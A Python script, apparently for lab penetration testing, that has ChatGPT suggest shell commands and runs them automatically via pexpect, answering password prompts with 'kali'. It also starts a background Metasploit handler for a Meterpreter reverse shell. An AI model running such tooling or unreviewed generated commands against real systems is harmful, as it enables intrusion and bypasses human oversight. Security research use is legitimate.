#!/usr/bin/env python3

import os
import re
import shutil
import sys
import json
import time
import queue
import threading
import logging
from typing import Dict, Any, List, Optional
import pexpect
from rich.console import Console

# -------------------------------------------
# Adjust these imports to match your project
from pentestgpt.utils.chatgpt import ChatGPT
from pentestgpt.config.chat_config import ChatGPTConfig
from prompts.prompt_class_v2 import PentestGPTPrompt
# -------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s - %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("pentestgpt_debug.log", mode='w')
    ]
)
logger = logging.getLogger(__name__)


class GPTClient:
    """
    A wrapper for handling GPT interactions, including conversation
    history, message sending, and advanced prompt management.
    """
    def __init__(self, config: ChatGPTConfig):
        self.chatgpt = ChatGPT(config)
        self.conversation_id: Optional[str] = None
        self.history: List[Dict[str, str]] = []

    def start_conversation(self, init_prompt: str, reasoning_prompt: str) -> None:
        try:
            init_response, self.conversation_id = self.chatgpt.send_new_message(init_prompt)
            if init_response:
                self.history.append({"user": init_prompt, "gpt": init_response})
            else:
                logger.warning("GPT did not provide an initialization response.")

            reasoning_response = self.chatgpt.send_message(reasoning_prompt, self.conversation_id)
            if reasoning_response:
                self.history.append({"user": reasoning_prompt, "gpt": reasoning_response})
            else:
                logger.warning("GPT did not provide a reasoning response.")

            logger.info(f"Conversation initialized with ID: {self.conversation_id}")

        except Exception as e:
            logger.error(f"Error initializing GPT conversation: {str(e)}")
            raise e

    def send_message(self, user_prompt: str) -> Optional[str]:
        if not self.conversation_id:
            logger.error("No conversation_id. Call start_conversation first.")
            return None

        reduced_history = self._reduce_chat_history()
        full_prompt = f"{reduced_history}\nUser: {user_prompt}\nGPT:"
        logger.debug(f"Sending prompt to GPT: {full_prompt[:200]}... (truncated)")

        try:
            response = self.chatgpt.send_message(full_prompt, self.conversation_id)
            if response:
                self.history.append({"user": user_prompt, "gpt": response})
                logger.info(f"GPT Response: {response[:100]}... (truncated)")
                return response
            else:
                logger.warning("GPT returned an empty or None response.")
                return None
        except Exception as e:
            logger.error(f"Error while communicating with GPT: {str(e)}")
            return None

    def _reduce_chat_history(self, max_messages: int = 10, max_tokens: int = 2000) -> str:
        if len(self.history) <= max_messages:
            return "\n".join(f"User: {entry['user']}\nGPT: {entry['gpt']}" 
                             for entry in self.history if 'gpt' in entry)

        latest_messages = self.history[-max_messages:]
        summarized = []
        for entry in self.history[:-max_messages]:
            if 'user' in entry and 'gpt' in entry:
                summarized.append(f"User: {entry['user'][:50]}...\nGPT: {entry['gpt'][:50]}...")
            else:
                summarized.append("[Omitted Non-GPT Data]")

        reduced_history_list = summarized + [
            f"User: {msg['user']}\nGPT: {msg['gpt']}"
            for msg in latest_messages if 'gpt' in msg
        ]
        history_string = "\n".join(reduced_history_list)

        # Rough token-based trimming
        while len(history_string) > max_tokens and summarized:
            summarized.pop(0)
            reduced_history_list = summarized + [
                f"User: {msg['user']}\nGPT: {msg['gpt']}"
                for msg in latest_messages if 'gpt' in msg
            ]
            history_string = "\n".join(reduced_history_list)

        return history_string


class CommandExecutor:
    """
    Handles the validation, simplification, and execution of system commands using pexpect.
    """
    def validate_command(self, command: List[str]) -> bool:
        if not command or not isinstance(command, list):
            return False
        if shutil.which(command[0]) is None:
            return False
        return True

    def simplify_command(self, command: List[str]) -> List[str]:
        if not command:
            return command

        # If command is 'nmap' but an existing nmap file is found, cat it instead
        if command[0] == "nmap" and False:
            existing_files = [f for f in os.listdir(".") if "nmap" in f and f.endswith(".txt")]
            if existing_files:
                logger.info(f"Found existing Nmap file: {existing_files[0]}. Using 'cat' instead of real nmap.")
                return ["cat", existing_files[0]]

        # Add '-c 6' to ping if missing
        if command[0] == "ping" and "-c" not in command:
            command.extend(["-c", "6"])

        # Add timeout to yes
        if command[0] == "yes":
            command = ["timeout", "5s"] + command

        return command

    def execute_command(self, command: List[str], timeout_sec: int = 60) -> Dict[str, Any]:
        command = self.simplify_command(command)
        if not command:
            return {"status": "error", "message": "Invalid or empty command."}

        cmd_str = " ".join(command)
        logger.info(f"Executing: {cmd_str}")
        try:
            process = pexpect.spawn(cmd_str, timeout=timeout_sec, encoding='utf-8')
            stdout_lines = []
            stderr_lines = []
            is_smbclient = (command[0] == "smbclient")

            while True:
                patterns = [pexpect.EOF, pexpect.TIMEOUT, r"[Pp]assword:"]
                if is_smbclient:
                    patterns.append(r"smb:\s*>")

                idx = process.expect(patterns, timeout=timeout_sec)
                if idx == 0:  # EOF
                    break
                elif idx == 1:  # TIMEOUT
                    stderr_lines.append("Timed out.")
                    process.terminate(force=True)
                    break
                elif idx == 2:  # password prompt
                    process.sendline("kali")
                elif is_smbclient and idx == 3:
                    process.sendline("")

                if process.before:
                    line = process.before.strip()
                    if line:
                        stdout_lines.append(line)

            process.close()
            if process.exitstatus not in (0, None):
                return {
                    "status": "error",
                    "message": f"Return code {process.exitstatus}\n" + "\n".join(stderr_lines),
                    "stdout": "\n".join(stdout_lines)
                }
            return {
                "status": "success",
                "message": "\n".join(stdout_lines)
            }

        except FileNotFoundError:
            return {"status": "error", "message": "Command not found."}
        except Exception as e:
            return {"status": "error", "message": str(e)}


class MetasploitManager:
    def __init__(self, script_path: str, output_queue: queue.Queue, stop_event: threading.Event):
        self.script_path = script_path
        self.output_queue = output_queue
        self.stop_event = stop_event
        self.thread: Optional[threading.Thread] = None

    def start(self):
        self.thread = threading.Thread(target=self._run_metasploit, daemon=True)
        self.thread.start()

    def _run_metasploit(self):
        cmd = f"msfconsole -r {self.script_path}"
        logger.info(f"Starting Metasploit with: {cmd}")

        try:
            child = pexpect.spawn(cmd, encoding='utf-8', timeout=None)
            child.logfile_read = None

            while not self.stop_event.is_set():
                idx = child.expect_exact([pexpect.EOF, '\n'], timeout=1)
                if idx == 0:
                    logger.info("Metasploit session ended.")
                    break
                elif idx == 1:
                    line = child.before
                    if line.strip():
                        logger.info(f"[Metasploit] {line.strip()}")
                        self.output_queue.put(line.strip())

            child.close()
        except pexpect.EOF:
            logger.info("EOF from Metasploit process.")
        except pexpect.TIMEOUT:
            logger.warning("Timeout reading from Metasploit process.")
        except Exception as e:
            logger.error(f"Error in Metasploit thread: {e}")

        logger.info("Metasploit thread exiting...")

    def join(self):
        if self.thread:
            self.thread.join()


class PentestOrchestrator:
    """
    Main orchestrator that coordinates:
    - GPT conversation
    - Command execution
    - Background Metasploit exploitation
    """
    def __init__(self,
                 target_ip: str,
                 target_desc: str,
                 my_ip: str,
                 log_dir: str = "logs",
                 nmap_data: Optional[str] = None):  # <-- NEW param for nmap data
        self.target_ip = target_ip
        self.target_desc = target_desc
        self.my_ip = my_ip
        self.log_dir = log_dir
        os.makedirs(log_dir, exist_ok=True)

        self.console = Console()
        self.gpt_client = GPTClient(ChatGPTConfig())
        self.executor = CommandExecutor()
        self.prompts = PentestGPTPrompt()

        self.commands_executed: List[Dict[str, Any]] = []
        self.metaploit_output_queue = queue.Queue()
        self.ms_stop_event = threading.Event()
        self.ms_manager: Optional[MetasploitManager] = None

        # Store the content of nmap_result.txt if provided
        self.nmap_data = nmap_data or ""

    def initialize(self):
        """
        Start GPT conversation with two initial prompts, but first
        embed any existing nmap data into the initial prompt.
        """
        self.console.print(f"Target IP: {self.target_ip}", style="bold green")
        self.console.print(f"Description: {self.target_desc}", style="bold green")

        if self.nmap_data:
            # Insert a note telling GPT not to run nmap again:
            nmap_note = (
                "\n\n[NOTE: We already have valid Nmap scan results, so **do not** run Nmap again. "
                "Use the results below for your analysis.]\n"
                f"{self.nmap_data}"
            )
            self.prompts.generation_session_init += nmap_note

        self.gpt_client.start_conversation(
            init_prompt=self.prompts.generation_session_init,
            reasoning_prompt=self.prompts.reasoning_session_init
        )

    def start_background_metasploit(self, metasploit_script: str):
        script_path = os.path.join(self.log_dir, "background_metasploit.rc")
        with open(script_path, "w") as f:
            f.write(metasploit_script)

        self.ms_manager = MetasploitManager(
            script_path=script_path,
            output_queue=self.metaploit_output_queue,
            stop_event=self.ms_stop_event
        )
        self.ms_manager.start()

    def check_background_metasploit_output(self):
        while not self.metaploit_output_queue.empty():
            line = self.metaploit_output_queue.get()
            analysis_prompt = (
                "Metasploit background output:\n"
                f"```\n{line}\n```\n"
                "Analyze the above line from Metasploit and provide any insights."
            )
            response = self.gpt_client.send_message(analysis_prompt)
            if response:
                logger.info(f"[GPT Analysis on MSF Output]: {response[:80]}...")

    def extract_command_from_gpt_response(self, response: str) -> Optional[List[str]]:
        if not response:
            return None
        pattern = r'```(?:bash|plaintext)?\s*(.*?)\s*```'
        matches = re.findall(pattern, response, re.DOTALL)
        if matches:
            return matches[0].strip().split()
        return None

    def main_workflow(self):
        user_msg = (
            f"{self.prompts.task_description}\n\n"
            f"Target IP: {self.target_ip}\n"
            f"Description: {self.target_desc}\n"
            f"{self.prompts.first_todo}"
        )
        gpt_response = self.gpt_client.send_message(user_msg)

        retry_count = 0
        max_retries = 5

        while retry_count < max_retries:
            self.check_background_metasploit_output()

            command = self.extract_command_from_gpt_response(gpt_response or "")
            if not command:
                logger.warning("No command extracted. Asking GPT for next steps.")
                retry_count += 1
                if retry_count >= max_retries:
                    break
                gpt_response = self.gpt_client.send_message(
                    "No valid command extracted. Please suggest the next command or steps."
                )
                continue

            if not self.executor.validate_command(command):
                logger.warning(f"Invalid command: {command}")
                retry_count += 1
                if retry_count >= max_retries:
                    break
                gpt_response = self.gpt_client.send_message(
                    f"Command `{command}` is not valid on this system. Suggest alternatives."
                )
                continue

            result = self.executor.execute_command(command)
            self.commands_executed.append({
                "command": " ".join(command),
                "status": result["status"],
                "output": result.get("message")
            })

            analysis_prompt = (
                f"The command `{command}` returned:\n"
                f"Status: {result['status']}\n"
                f"Output:\n```\n{result.get('message')}\n```\n"
                "Please analyze this and suggest the next command or steps."
            )
            gpt_response = self.gpt_client.send_message(analysis_prompt)

            time.sleep(2)
            if result["status"] == "success":
                retry_count = 0
            else:
                retry_count += 1

        logger.info("Main workflow finished. Stopping Metasploit if running.")
        self.ms_stop_event.set()
        if self.ms_manager:
            self.ms_manager.join()

    def save_history(self):
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        gpt_log = os.path.join(self.log_dir, f"gpt_history_{timestamp}.json")
        with open(gpt_log, "w") as f:
            json.dump(self.gpt_client.history, f, indent=2)
        logger.info(f"GPT history saved to {gpt_log}")

        cmd_log = os.path.join(self.log_dir, f"commands_executed_{timestamp}.json")
        with open(cmd_log, "w") as f:
            json.dump(self.commands_executed, f, indent=2)
        logger.info(f"Command execution log saved to {cmd_log}")


if __name__ == "__main__":
    target_ip = "10.10.10.40"
    target_desc = "A sample target for penetration testing"
    my_ip = "10.10.14.3"

    # ------------------------------------------------------
    # NEW: Read any existing Nmap data before orchestrator
    # ------------------------------------------------------
    nmap_file = "nmap_result.txt"
    nmap_data = ""
    if os.path.exists(nmap_file):
        with open(nmap_file, "r") as f:
            nmap_data = f.read()
        logger.info("Found existing nmap_result.txt and will embed it into the initial GPT prompt.")
    else:
        logger.info("No existing nmap_result.txt found. Will proceed without embedding.")

    # Pass the read data into the orchestrator
    orchestrator = PentestOrchestrator(
        target_ip,
        target_desc,
        my_ip,
        log_dir="logs",
        nmap_data=nmap_data  # pass the file contents here
    )
    orchestrator.initialize()

    sample_msf_script = f"""
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {my_ip}
set LPORT 4444
exploit -j
"""
    orchestrator.start_background_metasploit(sample_msf_script)

    orchestrator.main_workflow()
    orchestrator.save_history()
